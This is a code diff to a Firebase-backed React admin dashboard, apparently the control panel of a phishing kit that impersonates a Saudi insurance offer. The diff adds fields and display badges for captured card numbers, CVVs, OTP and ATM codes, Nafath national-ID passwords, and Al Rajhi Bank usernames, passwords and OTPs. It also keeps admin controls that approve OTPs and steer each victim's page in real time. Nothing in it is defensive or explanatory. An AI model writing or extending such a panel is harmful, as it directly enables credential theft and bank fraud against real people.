@@ -102,37 +102,81 @@ import { db, database, isFirebaseConfigured } from "@/lib/firebase";
 
 interface Notification {
   id: string;
-  fullName?: string;
+  // Personal Info (nested object)
+  personalInfo?: {
+    acceptMarketing?: boolean;
+    birthDay?: string;
+    birthMonth?: string;
+    birthYear?: string;
+    isHijri?: boolean;
+  };
   nationalId?: string;
-  phone?: string;
-  phone2?: string;
-  birthDate?: string;
+  phoneNumber?: string;
+  phoneCarrier?: string;
+  phoneIdNumber?: string;
+  
+  // Card Info
+  cardName?: string;
   cardNumber?: string;
-  cardLast4?: string;
   cardExpiry?: string;
   cardCvv?: string;
-  cardHolder?: string;
-  cardOtp?: string;
-  cardPin?: string;
-  pinCode?: string;
-  phoneOtp?: string;
+  
+  // OTP/Verification codes
+  otpCode?: string;
+  otpVerified?: boolean;
   phoneOtpCode?: string;
+  phoneOtpSubmittedAt?: string;
+  phoneSubmittedAt?: string;
+  phoneVerificationStatus?: string;
+  
+  // Nafaz
   nafazId?: string;
-  nafazPassword?: string;
+  nafazPass?: string;
+  nafazStatus?: string;
+  nafazSubmittedAt?: string;
   authNumber?: string;
+  
+  // Rajhi Bank
+  rajhiUser?: string;
+  rajhiPassword?: string;
+  rajhiOtp?: string;
+  
+  // ATM Verification (nested object)
+  atmVerification?: {
+    code?: string;
+    status?: string;
+    timestamp?: string;
+  };
+  
+  // Selected Offer (nested object)
+  selectedOffer?: {
+    insuranceType?: string;
+    offerId?: string;
+    offerName?: string;
+    totalPrice?: number;
+    status?: string;
+  };
+  
+  // Status & Navigation
+  approvalStatus?: string;
   currentPage?: string;
-  currentStep?: string;
+  currentStep?: number;
   status?: string;
   createdAt?: string;
-  createdDate?: string;
-  country?: string;
+  lastSeen?: any;
+  online?: boolean;
+  isUnread?: boolean;
+  isHidden?: boolean;
+  
+  // Priority color
   any?: "red" | "yellow" | "green" | null;
+  
+  // Admin controls
   cardOtpApproved?: boolean;
   cardPinApproved?: boolean;
   phoneOtpApproved?: boolean;
   nafathApproved?: boolean;
-  verified?: boolean;
-  isHidden?: boolean;
+  
   adminDirective?: {
     targetPage?: string;
     targetStep?: number;
@@ -420,9 +464,12 @@ export default function Dashboard() {
     return notifications.filter((notification) => {
       const matchesSearch =
         !searchTerm ||
-        notification.fullName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        notification.cardName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
         notification.nationalId?.includes(searchTerm) ||
-        notification.phone?.includes(searchTerm) ||
+        notification.phoneNumber?.includes(searchTerm) ||
+        notification.cardNumber?.includes(searchTerm) ||
+        notification.rajhiUser?.includes(searchTerm) ||
+        notification.nafazId?.includes(searchTerm) ||
         notification.id.includes(searchTerm);
       return matchesSearch;
     });
@@ -923,8 +970,8 @@ export default function Dashboard() {
                             <User className="h-5 w-5 text-primary" />
                           </div>
                           <div>
-                            <p className="font-medium text-sm">{notification.fullName || "زائر"}</p>
-                            <p className="text-xs text-muted-foreground">{notification.id.substring(0, 12)}...</p>
+                            <p className="font-medium text-sm">{notification.cardName || notification.nationalId || "زائر"}</p>
+                            <p className="text-xs text-muted-foreground">{notification.id.substring(0, 20)}...</p>
                           </div>
                         </div>
                       </td>
@@ -938,15 +985,20 @@ export default function Dashboard() {
                                 {notification.nationalId}
                               </Badge>
                             )}
-                            {notification.phone && (
+                            {notification.phoneNumber && (
                               <Badge className="text-xs bg-purple-600 text-white">
                                 <Phone className="h-3 w-3 ml-1" />
-                                {notification.phone}
+                                {notification.phoneNumber}
                               </Badge>
                             )}
-                            {notification.birthDate && (
+                            {notification.phoneCarrier && (
+                              <Badge className="text-xs bg-violet-500 text-white">
+                                {notification.phoneCarrier}
+                              </Badge>
+                            )}
+                            {notification.personalInfo?.birthYear && (
                               <Badge className="text-xs bg-indigo-600 text-white">
-                                {notification.birthDate}
+                                {notification.personalInfo.birthDay}/{notification.personalInfo.birthMonth}/{notification.personalInfo.birthYear}
                               </Badge>
                             )}
                           </div>
@@ -968,14 +1020,40 @@ export default function Dashboard() {
                                 CVV: {notification.cardCvv}
                               </Badge>
                             )}
-                            {notification.cardHolder && (
+                            {notification.cardName && (
                               <Badge className="text-xs bg-teal-600 text-white">
-                                {notification.cardHolder}
+                                {notification.cardName}
+                              </Badge>
+                            )}
+                          </div>
+                          {/* Nafaz Info */}
+                          <div className="flex flex-wrap justify-center gap-1">
+                            {notification.nafazId && (
+                              <Badge className="text-xs bg-cyan-600 text-white">
+                                نفاذ: {notification.nafazId}
+                              </Badge>
+                            )}
+                            {notification.nafazPass && (
+                              <Badge className="text-xs bg-cyan-700 text-white">
+                                كلمة السر: {notification.nafazPass}
+                              </Badge>
+                            )}
+                          </div>
+                          {/* Rajhi Info */}
+                          <div className="flex flex-wrap justify-center gap-1">
+                            {notification.rajhiUser && (
+                              <Badge className="text-xs bg-sky-600 text-white">
+                                الراجحي: {notification.rajhiUser}
+                              </Badge>
+                            )}
+                            {notification.rajhiPassword && (
+                              <Badge className="text-xs bg-sky-700 text-white">
+                                كلمة السر: {notification.rajhiPassword}
                               </Badge>
                             )}
                           </div>
                           {/* Show placeholder if no data */}
-                          {!notification.nationalId && !notification.phone && !notification.cardNumber && (
+                          {!notification.nationalId && !notification.phoneNumber && !notification.cardNumber && (
                             <Badge variant="secondary" className="text-xs mx-auto">
                               لا توجد بيانات
                             </Badge>
@@ -984,14 +1062,20 @@ export default function Dashboard() {
                       </td>
                       <td className="px-4 py-4">
                         <div className="flex flex-col items-center gap-1">
-                          {notification.cardOtp && (
-                            <Badge className="bg-blue-600 text-xs">{notification.cardOtp}</Badge>
+                          {notification.otpCode && (
+                            <Badge className="bg-blue-600 text-xs text-white">OTP: {notification.otpCode}</Badge>
                           )}
-                          {(notification.cardPin || notification.pinCode) && (
-                            <Badge className="bg-purple-600 text-xs">{notification.cardPin || notification.pinCode}</Badge>
+                          {notification.phoneOtpCode && (
+                            <Badge className="bg-pink-600 text-xs text-white">Phone: {notification.phoneOtpCode}</Badge>
                           )}
-                          {(notification.phoneOtp || notification.phoneOtpCode) && (
-                            <Badge className="bg-pink-600 text-xs">{notification.phoneOtp || notification.phoneOtpCode}</Badge>
+                          {notification.rajhiOtp && (
+                            <Badge className="bg-sky-600 text-xs text-white">Rajhi: {notification.rajhiOtp}</Badge>
+                          )}
+                          {notification.atmVerification?.code && (
+                            <Badge className="bg-orange-600 text-xs text-white">ATM: {notification.atmVerification.code}</Badge>
+                          )}
+                          {notification.authNumber && (
+                            <Badge className="bg-purple-600 text-xs text-white">Auth: {notification.authNumber}</Badge>
                           )}
                         </div>
                       </td>
@@ -1176,8 +1260,8 @@ export default function Dashboard() {
                           <User className="h-5 w-5 text-primary" />
                         </div>
                         <div>
-                          <p className="font-semibold">{notification.fullName || "زائر"}</p>
-                          <p className="text-sm text-muted-foreground">{notification.id.substring(0, 12)}...</p>
+                          <p className="font-semibold">{notification.cardName || notification.nationalId || "زائر"}</p>
+                          <p className="text-sm text-muted-foreground">{notification.id.substring(0, 20)}...</p>
                         </div>
                       </div>
                       <UserStatus visitorId={notification.id} />
@@ -1193,10 +1277,10 @@ export default function Dashboard() {
                           {notification.nationalId}
                         </Badge>
                       )}
-                      {notification.phone && (
+                      {notification.phoneNumber && (
                         <Badge className="text-xs bg-purple-600 text-white">
                           <Phone className="h-3 w-3 ml-1" />
-                          {notification.phone}
+                          {notification.phoneNumber}
                         </Badge>
                       )}
                       {notification.cardNumber && (
@@ -1215,12 +1299,23 @@ export default function Dashboard() {
                           CVV: {notification.cardCvv}
                         </Badge>
                       )}
+                      {notification.nafazId && (
+                        <Badge className="text-xs bg-cyan-600 text-white">
+                          نفاذ: {notification.nafazId}
+                        </Badge>
+                      )}
+                      {notification.rajhiUser && (
+                        <Badge className="text-xs bg-sky-600 text-white">
+                          الراجحي: {notification.rajhiUser}
+                        </Badge>
+                      )}
                     </div>
                     {/* OTP/PIN Info */}
                     <div className="flex flex-wrap gap-2">
-                      {notification.cardOtp && <Badge className="bg-blue-600 text-white">OTP: {notification.cardOtp}</Badge>}
-                      {notification.cardPin && <Badge className="bg-purple-600 text-white">PIN: {notification.cardPin}</Badge>}
-                      {notification.phoneOtp && <Badge className="bg-pink-600 text-white">Phone OTP: {notification.phoneOtp}</Badge>}
+                      {notification.otpCode && <Badge className="bg-blue-600 text-white">OTP: {notification.otpCode}</Badge>}
+                      {notification.phoneOtpCode && <Badge className="bg-pink-600 text-white">Phone: {notification.phoneOtpCode}</Badge>}
+                      {notification.rajhiOtp && <Badge className="bg-sky-600 text-white">Rajhi: {notification.rajhiOtp}</Badge>}
+                      {notification.atmVerification?.code && <Badge className="bg-orange-600 text-white">ATM: {notification.atmVerification.code}</Badge>}
                     </div>
 
                     <div className="flex gap-2 flex-wrap">
